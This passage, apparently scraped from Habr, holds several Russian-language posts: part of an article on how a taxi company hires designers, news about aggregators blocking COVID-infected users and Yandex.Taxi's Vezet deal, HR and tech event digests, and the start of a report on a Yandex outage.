предложенные идеи, говорим, что можно было бы поправить и советуем материалы для изучения. Обратная связь — прекрасный способ управлять негативом от отказа, но также и способ заложить фундамент на будущее: некоторые кандидаты не подходят из-за недостаточного опыта, поэтому важно рассказать им о том, куда двигаться, и оставить хорошее впечатление о нас, чтобы через год снова увидеться и поговорить о возможной работе.\n\nСделать процесс максимально эффективным и быстрым. Хороших кандидатов не так много, надо стараться не удлинять воронку общения, но при этом уметь выдерживать уровень кандидатов. \n\nКак выглядит наш процесс найма\r\nРассмотрение кандидата проходит в 5 этапов:\n\n\nОценка резюме и портфолио кандидата;\nСкрининг;\nИнтервью с будущим руководителем;\nИнтервью с командой продукта (продукт менеджер / руководитель направления);\nТестовое и его разбор с руководителем + HRBP.\n\nОценка резюме и портфолио\n\n\r\nЭта часть воронки отсеивает самую большую долю людей.\n\r\nПортфолио дольше нескольких минут никто не смотрит. Чаще всего нанимающему менеджеру все понятно по беглому взгляду на пару работ, более детальные вопросы по работам имеет смысл задавать на интервью, чтобы увидеть реакцию и оценить понимание бизнес-задач. В портфолио главное увидеть несколько ключевых пунктов:\n\nГрафический дизайн. Базовая проверка на хард-скиллы: все ли нормально с версткой, управлением пространством, работой с цветом, текстом и другими аспектами.\n\nЗрелость решений. По портфолио можно понять, насколько зрелые решения человек принимает с точки зрения логики интерфейса и работы продукта. Безусловно, есть множество примеров решений, когда оценка может быть дана только после A/B-тестирования и тестов в лаборатории — об этом можно будет поговорить с кандидатом на собеседовании. Это поможет понять, как человек реагирует на подобные вопросы, и насколько глубоко его понимание продукта и бизнеса.\n\nРелевантность опыта кандидата. Я делю этот пункт на два:\n\n\nОпыт работы по нашему направлению (внутренние системы) или смежным направлениям: различные B2B-сервисы, тулы, инфраструктурные подразделения. Ребята из соседних подразделений в большей степени ориентируются на b2c/c2c, поэтому у них есть свой пул важных параметров.\nСпецифика самого бизнеса: если кандидат работал в Gett/Везет/Uber/Я.Такси, то, конечно, должен хорошо понимать структуру бизнеса и его ключевые показатели. Значит либо это плюс для найма, либо, если кандидат был просто руками — минус.\n\nОтдельная история с резюме кандидата. Кажется, что это просто набор входных данных, но на самом деле, по резюме можно проследить, как развивалась карьера человека, и из этого сделать предположения о том, насколько он амбициозен, как быстро хочет развиваться, какие цели себе ставит. Не стоит делать поспешные выводы по резюме, но если у вас появились вопросы, их стоит задать.\n\r\nОднажды, когда я спросил кандидата на собеседовании, почему он выбирал компании, в которых работал, он ответил: «я хочу переходить в места, которые смогут повысить в дальнейшем мою стоимость». Это был бы абсолютно нормальный и достаточно амбициозный ответ, если бы у него был в резюме набор известных брендов, но это было совсем не так. Следующий его переход просто подтвердил, что человек ищет только деньги, а не какую-то перспективу роста.\n\nСкрининг\r\nIT-специалисты не любят звонки HR, дизайнеры в том числе. Но с точки зрения работы с воронкой кандидатов есть несколько важных вещей. Во время скрининга мы всегда хотим немного рассказать человеку о том, какие продукты мы делаем, как мы развиваемся, растем, над чем предстоит работать. Это удобнее сделать по телефону. Также разговор с кандидатом помогает оценить его навыки коммуникации. \n\r\nИногда в телефонном разговоре мы выясняем, какие задачи выполнял кандидат, обсуждаем непонятные моменты из резюме и узнаем зарплатные ожидания.\n\nИнтервью с будущим руководителем\n\n\r\nЗдесь, я думаю, не расскажу ничего нового. Мы проводим стандартное техническое интервью на один час, чтобы понять, насколько кандидат подходит компании и этому подразделению. Обычно мы выстраиваем диалог следующим образом:\n\r\nРуководитель рассказывает о целях компании, о продуктах, дизайн которых разрабатывается, проводит небольшую обзорную экскурсию по устройству департамента.\n\r\nСледующим этапом мы просим кандидата рассказать о нескольких последних местах работы, как были организованы процессы и продуктовые команды, какие были проблемные кейсы, как он их решал, как решал вопросы коммуникации. Качество ответов на эти вопросы позволяет понять зрелость кандидата как дизайнера: насколько он самостоятелен, правильно ли понимает, как должна быть устроена работа, что он будет ожидать от руководителя, подразделения и компании. Периодически мы проходимся по портфолио или просим организовать его презентацию, это помогает понять на каком уровне находятся навыки коммуникации у человека, и хорошо ли он понимает специфику бизнеса.\n\r\nЕсли на предыдущем этапе не хватило данных, мы просим кандидата решить несколько кейсов. Они связаны и с общим понимание процесса поиска решения и с коммуникациями. Обычно кейсы занимают приблизительно 20 минут, мы даем общую канву задачи, условия можно менять на ходу. Главное не перегибать палку, важно чувствовать настроение кандидата.\n\nСекция вопросов от кандидата. Собеседование это всегда про две стороны, поэтому на завершающем этапе интервью мы отвечаем на максимально большое количество вопросов кандидата. Особенно люблю ребят, у которых все вопросы заранее записаны :) \n\r\nПосле интервью отсеивается больше половины кандидатов, которых отобрали ранее. Около 65-70%. Через 2-3 дня после этого этапа мы принимаем решение о том, хотим ли мы предложить кандидату выполнить тестовое задание и познакомить его с командой продукта.\n\nТестовое задание\n\n\r\nСамый болезненный этап. Здесь и проявляется результат всего, что мы услышали, увидели, о чем спросили. Но надо понимать, что тестовое — это не способ получить от кандидата гениальные мысли, которые мы украдем и пустим в продакшен. Это лишь еще один способ познакомиться, узнать, каков кандидат на самом деле в работе.\n\r\nМожно очень много рассказать, напустить пыли в глаза, но все же тестовое часто расставляет все на свои места.\n\nОтносительно тестовых есть несколько правил:\n\n\nОно не должно занимать больше 2-3 вечеров (вечеров после работы, а не 2-3 дня фулл-тайм);\nНикаких ограничений по времени для кандидата. У всех есть работа, личные дела, семья и т.д. Я всегда прошу человека самостоятельно оценить срок выполнения тестового. Именно в этот день я и буду ожидать результат, но дату кандидат называет сам. Здесь проверяется очень многое: мотивация, ответственность, умение соблюдать сроки. Что забавно, тестовое, выполненное раньше срока, редко получается хорошим. Люди спешат, совершают банальные ляпы. Ну и здесь же живет множество других болезней дизайнеров: «не успеваю», «можно я пришлю попозже», «ой, а я забыл вам сказать, что ...», «дайте мне готовый ui kit» и т.д. \nНе страшно, что человек что-то не успевает, у него изменились обстоятельства или случилось что-то непредвиденное. Страшнее, что это все происходит в последний день.\nТестовые выбираются для конкретного кандидата, чтобы проверить навыки, которых не хватило из интервью и разбора портфолио.\nТестовые не связаны с текущими или будущими боевыми задачами.\nТестовое не всегда идет последовательно после собеседования с руководителем. Комбинация может меняться и, например, кандидат может делать тестовое параллельно со знакомством с командой или после него. Это обеспечивает необходимую гибкость в общения с людьми Senior+, а также дает возможность провести кандидата через несколько команд.\nВсегда даем фидбек на тестовое.Иногда кандидат хорошо проявляет себя на интервью, но с тестовым что-то идет не так. В этом случае мы просим сделать еще один подход к тестовому и доработать задание по нашим комментариям. Это дает точное понимание уровня навыков кандидата. \n\n\nИнтервью с командой продукта (продукт менеджер / руководитель направления)\n\n\r\nЭто собеседование на так называемый cultural fit. У дизайнера будет свой руководитель по специализации, но работает он в команде продукта. У всех команд свои особенности построения процессов и своя культура. Важно, чтобы дизайнер хорошо подходил и своему будущему руководителю, и команде продукта.\n\r\nОбычно на собеседовании от команды приходит менеджер продукта и руководитель направления. Первый пытается понять, насколько комфортно ему работать с дизайнером, т.к. дизайнер и продукт-менеджер это такая «продуктовая двойка», где люди работают, как партнеры.\n\r\nКандидат, который не подошел одной команде, может легко подойти другой, поэтому надо понимать, что отказ на интервью с командой не означает финального «нет».\n\nФинал — разбор тестового с кандидатом\r\nРазбор тестового задания происходит уже с финалистами. Этот этап похож на одну из частей «интервью с руководителем», но более сжатый по времени. Проходимся по задаче, спрашиваем, как человек подошел к ее решению и обсуждаем эти решения.\n\r\nЭтот этап интересен тем, что на нем присутствует HRBP подразделения, задача которого проверить мотивационную составляющую кандидата. Вам может показаться, что это странно, но я много раз видел, как в больших IT-компаниях нанимают людей исключительно из-за их hard-skills и после страдают от неоправданных ожиданий, слабой мотивации, токсичности и других неблагоприятных психологических факторов.\n\nОффер\n\n\r\nЕсли все срослось, человек получает оффер :) В среднем нам хватает двух рабочих дней после финала, чтобы сделать свое предложение кандидату, и обсудить его с ним.\n\r\nПосле того, как мы презентуем человеку оффер, начинается следующая часть — онбординг. Он начинается именно в момент, когда мы делаем предложение, а не когда уже выводим человека на работу. Но об этом — в следующей статье.", {"day": "30", "month": "апреля", "time": "15:44"}, {"rate": 1, "views": 5800}], ["Агрегаторы такси Uber и Lyft сообщили, что рассматривают возможность временно массово блокировать аккаунты водителей и пассажиров, заболевших коронавирусом COVID-19, пишет The Verge. В начале февраля Uber уже отключал учётные записи своих мексиканских клиентов, чтобы предотвратить распространение болезни.\n\r\nПо словам представителей Uber, у них есть команда, которая работает со здравоохранительными органами — получая информацию от чиновников, компания сможет заблокировать аккаунты заболевших коронавирусом. Планируется, что Uber начнёт временные блокировки в США, при этом консультируясь с эпидемиологами касательно каждого отдельного случая. В компании утверждают, что предоставят всем заблокированным водителям пособия по болезни на 14 дней. \n\r\nКак пишет The Verge, компания может пойти на массовую блокировку в связи с тем, что приходят новые сообщения о заболеваниях коронавирусом среди водителей сервиса. Так, одним из первых подтверждённых случаев в Нью-Йорке стал водитель Uber из Квинса. При этом подробной информации о планах как на блокировку, так и на пособие по болезни водителям в компании не предоставили; как отмечает издание, некоторые водители сервиса уже жаловались на то, что Uber оказывает им недостаточную поддержку в связи с болезнью. \n\r\nРоссийские агрегаторы такси тоже заявили о возможности блокировать учётные записи заболевших. Представитель ГК «Везет» Зоя Австрийская рассказала РБК, что компания сможет точечно ограничивать работу учётных записей. По её словам, вся сложность состоит в в точности определения людей в зоне риска, а также в передаче их данных агрегатору с сохранением персональных данных и медицинской конфиденциальности. Такой же позиции придерживаются и в Gett — представители агрегаторы заявили, что смогут блокировать аккаунты людей с подозрением на коронавирус, если оперативные штабы будут предоставлять списки заражённых. Однако на данный момент блокировка учётных записей не предусмотрена, поскольку агрегатор не располагает данными о заболевших. \n\r\nПока никаких договорённостей с оперативным штабом по контролю и мониторингу ситуации с коронавирусом нет, агрегаторы работают над альтернативными методами профилактики заболевания. В «Ситимобиле» рассказали РБК, что собираются обязать таксопарки и ИП проверять состояние здоровья водителей и не допускать к работе при наличии симптомов ОРВИ и гриппа. Кроме того, они должны регулярно пользоваться одноразовыми масками, антисептиками для рук, обрабатывать ими ручки дверей и проводить влажную уборку салона. В данный момент «Ситимобил» ведёт об этом переговоры с подрядчиками — компенсировать расходы на процедуры по профилактике компания собирается за свой счёт. \n\r\nПредставитель Яндекс.Такси Наталья Рожкова говорит, что компания планирует организовать в аэропорту Шереметьево пункты, где водители смогут бесплатно получить медицинские маски и средства для дезинфекции. Такое решение в агрегаторе приняли в связи с тем, что часто случаи заражения коронавирусом происходят в связи с возвращением из-за рубежа, особенно из стран Европы, охваченных эпидемией. Кроме того, утверждает Рожкова, в 40 точках Москвы для водителей поставили пункты бесплатной самодиагностики, которые будут отмечены на карте в приложении для водителей. \n\r\nВ марте «Коммерсантъ» писал, что московские власти разработали план по предупреждению коронавирусной инфекции в столице. Он состоит из трёх этапов: на первом предусматривалась термометрия всех прибывших в Москву авиапассажиров, на втором (который, вероятно, уже начинается) власти собираются закрывать на карантин школы, детсады, вузы, концертные залы, стадионы и рынки, третий же этап состоит в введении чревычайного положения с комендантским часом. Касаемо водителей такси власти разослали агрегатором рекомендации — в них говорится, что таксопаркам следует обеспечить «многократную и ежедневную» дезинфекцию в машинах такси и каршеринга. Кроме того, таксопаркам следует снабдить водителей запасом медицинских масок, дезинфицирующими салфетками и кожными антисептиками. \n\r\nОтмечается, что рекомендации агрегаторам и таксопаркам разослали ещё 5 марта, а об их выполнении компании сообщили только сейчас; об этом предупреждал глава координационного совета профсоюза «Таксист» Андрей Попков — по его словам, из-за сложности контроля за исполнением этих мер и высокой стоимости никто выполнять их не собирался.\nСм. также: «Коронавирус COVID-19: только факты, без паники»", {"day": "13", "month": "марта", "time": "15:01"}, {"rate": 12, "views": 3000}], ["Компания «Яндекс.Такси», которая покупает активы конкурента — группы компаний «Везет» — обратилась в Федеральную антимонопольную службу с просьбой изменить методику оценки рынка такси. \n\r\nФАС ранее заявила, что одобрит сделку, если доля «Яндекс.Такси» на рынке по ее итогам не будет превышать 50%. \n\r\nГлава ФАС Игорь Артемьев сказал: «В рамках существующей модели у них доля во многих городах зашкаливает, и мы обеспокоены, что может возникнуть монополизация. Поэтому мы так долго рассматриваем эту сделку».\n\r\nПри этом, по словам чиновника, «в рамках существующего законодательства, существующих методик как считать рынки в условиях цифровизации, агрегаторов — это такая вещь, которая сейчас достаточно подвижна». \n\r\nАртемьев считает, что, если методика ФАС все же изменится, то к данной сделке будет иной подход. Глава ФАС сообщил, что сейчас говорить об этом рано, ведутся переговоры как с самим агрегатором, так и с консультантами, юридическими советниками, советниками по инновационному бизнесу, подсчету рынков, экономическими советниками. \n\r\n«Они хотят нам доказать, что методика, которую мы используем, устарела, и что нужно применять другую, и доли на рынке будут другие и можно будет это разрешить. Я пока каких-то существенных аргументов в пользу такого изменения методики не вижу», — подытожил Артемьев.\n\r\nТретье ходатайство «Яндекс.Такси» о сделке ФАС рассмотрит до конца апреля 2020 года.\n\r\nВ свою очередь, в самой компании заявили, что с ФАС ведется диалог, и ей предоставляют всю информацию, необходимую для анализа рынка такси.\n\r\nО сделке между «Яндекс.Такси» и «Везет» стало известно в июле 2019 года. В рамках сделки «Яндекс.Такси» должна вложить около 8 млрд рублей в развитие такси в регионах России и на внедрение технологий для обеспечения безопасности поездок. Акционеры «Везет» получат до 3,6% акций «Яндекс.Такси», а также $71,5 млн при выполнении KPI по операционным и другим показателям. После закрытия сделки 56,2% акций будет принадлежать Яндексу, 35% — Uber, 5,3% — сотрудникам в рамках программы поощрения.\n\r\nКак заявляли в Яндексе, суть сделки состоит не приобретение самой компании «Везет», а в покупке ее активов. Пользователи при этом смогут продолжать заказывать такси через приложения «Везет» и RuTaxi, но водители и таксопарки перейдут на платформу «Яндекс.Такси». См. также: ««Яндекс.Такси» и не только: что известно о возможных IPO российских компаний в 2020 году В сентябре 2019 года сервис Gett пожаловался на сделку в ФАС. Там заявили, что она приведет к усилению монополии «Яндекс.Такси», росту цен на поездки, снижению зарплат водителей.\n\r\nПосле этого, в октябре, «Яндекс.Такси» отозвала первое ходатайство о сделке и внесла новое, включив в нее новые объекты собственности «Везёт». Затем компания подала третье ходатайство с дополнительной информацией для оценки ситуации на рынке.\n\r\nВ группу компаний «Везет» входят бренды такси «Везет», «Лидер», Red Taxi и Fasten. ГК была основана в мае 2017 года. В 2017 году на ее долю приходилось 12,3% рынка такси-перевозок в России. См. также: «Рейтинг в Яндекс.Такси: короткий пост на серьёзную тему На днях «Яндекс.Такси» внедрил систему социального рейтинга для пассажиров. Теперь водители тоже могут ставить им оценки. Пассажиры с высоким рейтингом смогут рассчитывать на приоритетное обслуживание, а вот пользователей, у которых низкий балл, могут отказаться обслуживать.См. также: \n\n\n«Крупнейшие российские агрегаторы попросили не ограничивать число таксистов»\n«Роскачество выбрало самые безопасные приложения для заказа такси»\n«Китайский такси-агрегатор DiDi ищет сотрудников для российского офиса»", {"day": "3", "month": "марта", "time": "11:00"}, {"rate": 9, "views": 5900}], ["Первый весенний дайджест получился насыщенным: курсы и вебинары погрузят вас в основы IT HR, научат правильно продвигать вакансии, помогут быстро собрать IT-команду и улучшить эйчар-бренд компании. А на встречах сообщества в Москве, Минске и Иннополисе вы сможете прокачать навыки сорсинга и обсудить с коллегами насущные вопросы.\n\r\nСледите за обновлениями поста, анонсы на вторую половину месяца могут быть добавлены позже, о чём я обязательно напишу в комментариях.\n\n\n«Лендинг вакансии: создаем и продвигаем» (онлайн-курс)\nКогда: начало 2 марта\nГде: онлайн\nУсловия участия: 19 900 рублей (Стандарт), 24 900 рублей (Практикум), 34 900 рублей (Приорити)\nОрганизатор: MarHR\n\r\nБорьба за внимание кандидатов накаляется, нужно уметь презентовать все преимущества работы в компании, отрабатывать возражения, привлекать с помощью digital-инструментов, анализировать эффективность и возвращать тех, кто не пришел в первый раз.\n\r\nКурс научит, как:\n\n\nДоставать пассивных кандидатов, которых нет на работных сайтах;\nСоздавать большой охват для дальнейшего отсева (видео интервью, тестовые задания);\nУвеличить узнаваемость и привлекательность бренда вашей компании;\nПовысить эффективность других hr-проектов: кадровый резерв, опрос по вовлеченности, адаптация и т.д.\n\r\n→ Подробности и регистрация\n\n\n«Погружение в IT» (онлайн-курс)\nКогда: начало 2 марта\nГде: онлайн\nУсловия участия: 17 900 рублей \nОрганизатор: Черногорцева Ирина\n\r\nКурс подойдёт IT-рекрутерам без опыта или уровня джуниор.\n\r\nВ процессе обучения вы:\n\n\nУзнаете, какие специалисты есть в IT, чем они занимаются и как в каждом направлении различать одних от других;\nПоймёте, на что обращать внимание при поиске;\nНаучитесь среди кучи непонятных слов в резюме видеть главное;\nНаучитесь названием вакансии привлекать нужных специалистов.\n\r\n→ Подробности и регистрация\n\n\n«HR в IT» (онлайн-курс)\nКогда: начало 3 марта\nГде: онлайн\nУсловия участия: 4900 рублей (Базовый), 8900 рублей (Pro)\nОрганизатор: МТС Университет\n\r\nЦель курса — научить с помощью эффективных методов искать, находить, удерживать ИТ-специалистов и «выращивать» из них талантов.  \n\r\nВ программе:\n\n\nНеделя 1. «Айтишник, где же ты? Как тебя найти и не потерять?»;\nНеделя 2. «Добро пожаловать на борт или всё про адаптацию айтишников»;\nНеделя 3. «Айтишники в корпоративной культуре — миф или реальность?»;\nНеделя 4. «Алло, мы ищем таланты!».\n\r\n→ Подробности и регистрация\n\n\nСорсинговый митап и хакатон\nКогда: 4 марта, 19:00\nГде: Москва, пер. Оружейный, д. 41\nУсловия участия: бесплатно\nОрганизатор: AmazingHiring\n\r\nAmazingHiring вместе с МегаФоном проведут митап и хакатон по сорсингу в Москве.\n\r\nВ программе:\n\n\n«Продвинутый X-Ray» — Нарек Асликян, AmazingHiring;\n«Как выстроить сорсинг, который справляется с любым поиском» — Светлана Стародубова, МегаФон;\nСорсинговый хакатон.\n\r\n→ Подробности и регистрация\n\n\n«Как быстро набрать IT команду и улучшить бренд работодателя?» (вебинар)\nКогда: 5 марта, 10:00\nГде: онлайн\nУсловия участия: бесплатно\nОрганизатор: ВИЗАВИ Консалт\n\r\nНа примере своего проекта команда ВИЗАВИ Консалт расскажет, как с помощью инструментов маркетинга быстро набрать более 50 сотрудников в IT-команду.\n\r\nВедущие вебинара:\n\n\nВалерия Дворцевая — управляющий партнёр, генеральный директор ВИЗАВИ Консалт;\nИван Савченко — IT-рекрутер, консультант ВИЗАВИ Консалт.\n\r\n→ Подробности и регистрация\n\n\n«IT HR Global Meetup #3: Minsk Edition» (митап)\nКогда: 7 марта, 11:00\nГде: Минск, ул. Академика Купревича, д. 3V\nУсловия участия: бесплатно\nОрганизатор: IT-Доминанта\n\r\n«IT HR meetup» — это неформальные встречи эйчаров IT-компаний. На этот раз митап проходит в рамках подготовки к конференции HR API 2020, которая состоится 24-25 апреля в Санкт-Петербурге.\n\r\n→ Подробности и регистрация\n\n\n«ИТ-ликбез для HR» (курс)\nКогда: 13-14 марта\nГде: Иннополис, ул. Университетская, д.1\nУсловия участия: 19 000 рублей (обучение), 22 000 рублей (повышение квалификации)\nОрганизатор: Университет Иннополис\n\r\nДвухдневный курс повышения квалификации для тех, кто нанимает и управляет IT-специалистами или планирует работать HR в сфере IT.\n\r\nВ программа:\n\n\nИТ-ликбез для HR. Основные понятия;\nОбзор рынка труда в ИТ-области;\nКарьерные треки в ИТ;\nПодбор ИТ-специалистов;\nСпецифика собеседования ИТ-специалистов;\nПрактика и кейсы.\n\r\n→ Подробности и регистрация\n\n\n«Антиклуб: удержание vs. рекрутинг» (митап)\nКогда: 17 марта, 10:00\nГде: Москва, адрес уточняется\nУсловия участия: бесплатно\nОрганизатор: ВИЗАВИ Консалт\n\r\nАнтиклуб организован для компаний IT и финансовой отрасли.\n\r\nВ программе:\n\n\nКак через ценности компании закрыть более 50 IT-вакансий всего лишь с одной заменой в течение года?\nЦифровые методы снижения текучести IT и финансового персонала.\nПрограммы поддержки сотрудников как один из инструментов вовлеченности и удержания персонала.\n\r\n→ Подробности и регистрация\n\n\nМастер-класс Ирины Шамаевой по сорсингу\nКогда: 19 марта, 10:30\nГде: Москва, адрес уточняется\nУсловия участия: 20 000 рублей\nОрганизатор: INDEX\n\r\nINDEX и Хантфлоу организуют мастер-класс самого известного в мире сорсера — Ирины Шамаевой.\n\r\nВ программе: \n\n\nГде искать кандидатов — поисковики, социальные сети и профессиональные сайты;\nУниверсальный принцип поиска;\nБулева логика;\nОператоры Google и X-Ray;\nРабота с изображениями;\nИнструменты поиска контактной информации;\nРасширения Chrome;\nGithub — рай для сорсеров;\nCustom Search Engines;\nЗападные практики.\n\r\n→ Подробности и регистрация\n\n\n«HR MOBILE» (конференция)\nКогда: 20 марта, 9:00\nГде: Москва, ул. Петровка, д. 11\nУсловия участия: 18 500 рублей (Standard), 20 500 рублей (Professional), запись конференции — 5500 рублей. Цены действительны до 1 марта.\nОрганизатор: MK GROUP\n\r\nВторая всероссийская конференция о современных HR-технологиях, которые можно поместить в мобильный телефон. Чат-боты, micro-learning, подбор, оценка персонала, аналитика данных, коммуникации и другие возможности под рукой.\n\r\nВ программе выступления представителей МТС Банк, VELUX, Ростелеком, Tele2, T&D Technologies и других крупных компаний.\n\r\n→ Подробности и регистрация\n\n\n«IndexSource» (конференция)\nКогда: 20 марта, 10:00\nГде: Москва, пер. Спартаковский, д. 2, стр. 1, подъезд 7\nУсловия участия: 10 500 рублей\nОрганизатор: INDEX\n\r\nКонференция о сорсинге в широком смысле: теоретические основы, конкретные инструменты, практики и лайфхаки и сорсинг с точки зрения бизнеса, как составляющая процесса подбора.\n\r\nДоклады и спикеры:\n\n\n«Что сеть знает о вас. Данные о людях в интернете: где находятся и как найти» — Сергей Золотухин, GroupIB;\n«Современный сорсер, как набор компетенций»\n«Один день из жизни опытного сорсера» — Алина Моиз, GitLab;\n«Custom Search Engines (CSEs)» — Ирина Шамаева, Sourcing Certification;\n«Sourcing on GitHub (доклад на английском с переводом)» — Ач Петросян, RockbiteGames Armenia и Meettal;\n«Где сидят разработчики: битва источников» — Кирилл Ольховик, AmazingHiring;\n«Система сорсинга в Gett: как организовать эффективный сорсинг в продуктовой компании» — Алёна Аржанова, Gett;\n«Выстраивание сорсинга в распределенной и мультикультурной команде» — Анастасия Пшегодская, GitLab;\n«Помоги Даше-сорсеру составить карту поиска!» — Егор Яценко, Arena.tech.\n\r\n→ Подробности и регистрация\n\n\n«IT-Recruiter. Интенсив» (курс)\nКогда: начало 28 марта\nГде: Санкт-Петербург, Невский пр., д. 104\nУсловия участия: 35 990 рублей\nОрганизатор: Level UP\n\r\nКурс разработан для тех, кто хочет начать заниматься подбором IT-специалистов. Программа состоит из технического и рекрутингового модулей.\n\r\nВ программе:\n\n\nЧто и как устроено в IT-сфере в целом. Где и для чего используются те или иные языки программирования, технологии, фреймворки. Чем занимаются те, кого вам предстоит искать.\nКак правильно снимать заявку и работать с нанимающим менеджером.\nКак самостоятельно составлять вакансию со сложными техническими терминами.\nТонкости и лайфхаки поиска IT-специалистов разного уровня.\nПриёмы поиска, о которых еще не написали в книгах.\nКак правильно позиционировать компанию на высококонкурентном рынке IT.\nОсновы HR брендинга и HR аналитики.\n\r\n→ Подробности и регистрация\n\n\nОб организаторах мероприятий:\n\n\nВИЗАВИ Консалт — федеральная рекрутинговая сеть.\nIT-Доминанта — рекрутинговое агентство, специализируется на поиске ИТ-специалистов.\nМТС Университет — образовательные программы для профессионального и личностного развития.\nЧерногорцева Ирина — частный IT-рекрутер.\nAmazingHiring — приложение для поиска IT-специалистов.\nINDEX — рекрутинговое агентство, специализируется на поиске ИТ-специалистов.\nLevel UP — IT-образование В Санкт-Петербурге и удалённо.\nMarHR — проект, посвященный маркетингу в HR.\nMK GROUP — организация деловых мероприятий\n\r\nЕсли в этом дайджесте вы не нашли события, которые пройдут в марте, пожалуйста, добавляйте их в комментарии. А если вы организатор таких мероприятий и хотите, чтобы они появлялись в наших дайджестах, то присылайте информацию мне на litvinenko@habr.team.", {"day": "27", "month": "февраля", "time": "13:55"}, {"rate": 6, "views": 2200}], ["Подборка мероприятий на неделю\n\nMosQA meetup #2 в Mail.ru Group\n\n25 февраля (вторник)\nЛенинградский просп 39с79\nбесплатно\n25 февраля в московском офисе Mail.ru Group пройдет второй митап сообщества тестировщиков MosQA. Сообщество основано сотрудниками нашей компании как площадка для обмена опытом, экспертизой и поддержка для всех, кто связан с процессами тестирования в своих проектах. В программе митапа: 4 технических доклада, свободное общение и небольшая викторина.\n\nPytup\n\n26 февраля (среда)\nЛТолстого 16\nбесплатно\nМы приглашаем в московский офис Яндекса специалистов по Python всех уровней: от junior до senior. Выступят опытные разработчики из Яндекс.Погоды и направления беспилотных авто, а также руководитель разработки из QIWI. Они затронут не только практики, касающиеся самого языка и его библиотек, но и околопитонные темы. \n\nОлег Железко в BellClub\n\n26 февраля (среда)\nНовая площадь 6\n10 000 р.\n26 февраля гостем BellClub станет основатель и управляющий партнер инвестиционной группы Da Vinci Capital Олег Железко. В ее портфеле акции Московской биржи ММВБ-РТС, сервиса заказа такси Gett, IT-холдинга Softline и других компаний. \n\nМобильный маркетинг: тренды и кейсы\n\n26 февраля (среда)\nЛенинский пр-т 6с20\nбесплатно \n26 февраля приглашаем на встречу «Мобильный маркетинг: тренды и кейсы» в Лектории «Skillbox».\r\nНа встрече эксперты поговорят о трендах мобильного маркетинга в 2020 году, на примере собственных проектов расскажут об основных инструментах и покажут успешный кейс челленджа в TikTok.\n\nКонференция Callday.Tourism 2020\n\n27 февраля (четверг)\nЛТолстого 16\nбесплатно \nВ четверг, 27 февраля, состоится ежегодная конференция про сквозную аналитику и эффективный маркетинг в сфере туризма — Callday. Tourism 2020. Организаторы Calltouch и Яндекс.\r\nМероприятие соберет более 200 профессионалов индустрии. В числе спикеров такие компании, как: Samsonite, Alean Family Resort Collection, загородный отель «Царьград»,TUI Group, а также эксперты Яндекс.Дзен, myTarget, Яндекс и Calltouch.\n\nStartups pitch to Сorporates 2.0 в рабочем пространстве WeWork\n\n27 февраля (четверг)\nБолЯкиманка 26\nбесплатно\n27 февраля Winno Moscow и WeWork Labs совместно проводят мероприятие Startups pitch to Corporates. На одной площадке встретятся стартапы и представители корпораций. На настоящий момент приглашены Leroy Merlin, Coca Cola, Росбанк, FM Logistic, Borjomi, Мегафон и др.\n\nEcommerce marketing\n\n28 февраля (пятница)\nЛенинский пр-т 6с20\nбесплатно\nНа встрече обсудим digital-инструменты продвижения e-commerce бизнеса. Эксперты Molinos и Яндекс.Маркет подготовили авторские выступления. Поговорим про SEO тренды в электронной торговле, e-commerce будущего, внедрение чат-ботов и составление карты пользовательского опыта CJM.\n\nТемный питч. Конкурс идей, питчей и стартапов. Получи грант на обучение в школе стартапов RUSSOL\n\n28 февраля (пятница)\nБолСаввинский пер 12\nот 599 р.\nУчаствуй в открытом конкурсе питчей на получение гранта на обучение в весеннем потоке школы стартапов RUSSOL. Прокачай свой русский или английский питч, а также узнай, что о твоем стартапе или идее думают эксперты\r\nГлавный приз — грант в 150 тыс рублей на обучение в школе стартапов RUSSOL. Что это значит? Вы регулярно общаетесь с наставниками школы и экспертами, чтобы понять, как работает рынок, как продвигать продукт, как привлекаются инвестиции и, напр., делаются продажи. \n\nЯ ︎ Фронтенд 2020\n\n29 февраля (суббота)\nЛТолстого 16\nбесплатно\nЕсли вы неравнодушный фронтенд-разработчик с горящими глазами и жаждой к знаниям, то ждём вас для бурного обсуждения последних новостей и лучших практик в мире разработки интерфейсов.\n\nХакатон по навыкам для Станции\n\n29 февраля (суббота)\nФрунзе 11корп2\nбесплатно\nВ течения дня команды посоревнуются в создании полезных или просто весёлых навыков, адаптированных к чисто голосовому управлению. \r\nВ процессе работы участники будут получать обратную связь от команды Диалогов. Все команды, которые опубликуют навык в конце дня, получат приз — Станцию Мини. Лучшие навыки также получат помощь в продвижении.\n\nКонференция ProductCamp\n\n29 февраля (суббота) — 01 марта (воскресенье)\nБолПочтовая 20с1\nбесплатно\nProductCamp -- это не просто конференция, это сообщество единомышленников, которые делятся своими идеями, полезной информацией о новых продуктах и сервисах. Это мероприятие, где нет случайных людей или просто участников.\r\nОсновная ценность формата -- каждый вносит свой вклад.", {"day": "24", "month": "февраля", "time": "14:01"}, {"rate": 2, "views": 507}], ["5 февраля 2020 года в работе «Яндекса» произошел сбой. Согласно данным сервиса Downdetector на 16:00 по московскому времени с проблемами в работе сервиса столкнулись более пяти тысяч человек. Сбой затронул пользователей из Москвы, Санкт-Петербурга, Волгограда, Калининграда, Ярославля, Нижнего Новгорода, Самары, Саратова, Краснодара, Екатеринбурга, Уфы, Омска, Новосибирска, Астрахани, Владивостока и других городов.\n\r\nОсновные жалобы: не работает почтовый сервис «Яндекс.Почта», недоступен «Яндекс.Диск», есть проблемы с доступом к музыкальным сервисам (голосовой помощник Алиса тоже не может включить песни), «Кинопоиску», «Яндекс.Такси» и Uber (невозможно вызвать машину и принять заказ), «Яндекс.Метрике», «Яндекс.Дзен», каршерингу «Яндекс.Драйв», нет возможности сделать денежные операции через «Яндекс.Деньги».\n\r\n«У ряда пользователей возникают кратковременные трудности с доступом к сервисам «Яндекса». Наши специалисты работают над устранением сложностей», — говорится в сообщении пресс-службе компании, после подтверждения проблем многими пользователями.\n\r\nЧерез полтора часа после возникновения проблемы, она была частично устранена специалистами «Яндекс», но еще не полностью. Причина возникновения сбоя в работе сервисов компании на данный момент не уточнена. Работы по восстановлению доступа к сервисам «Яндекс» продолжаются.\n\n\n\n\n\n\n\nЯндекс Дзён фсё .... pic.twitter.com/n7dj7JSRPg— video-time.ru (@avitopay) February 5, 2020\n\n\n\r\nИз-за сбоя в «Яндекс.Такси» подорожали услуги такси в других сервисах. Также возросла нагрузка на сервисы «Ситимобил», «Везет» и Gett.\n\r\nВ компании «Ситимобил» допустили повышение цен на такси из-за сбоя в сервисе «Яндекса». «Из-за возросшей более чем в два раза нагрузки в некоторых районах может быть долгое ожидание 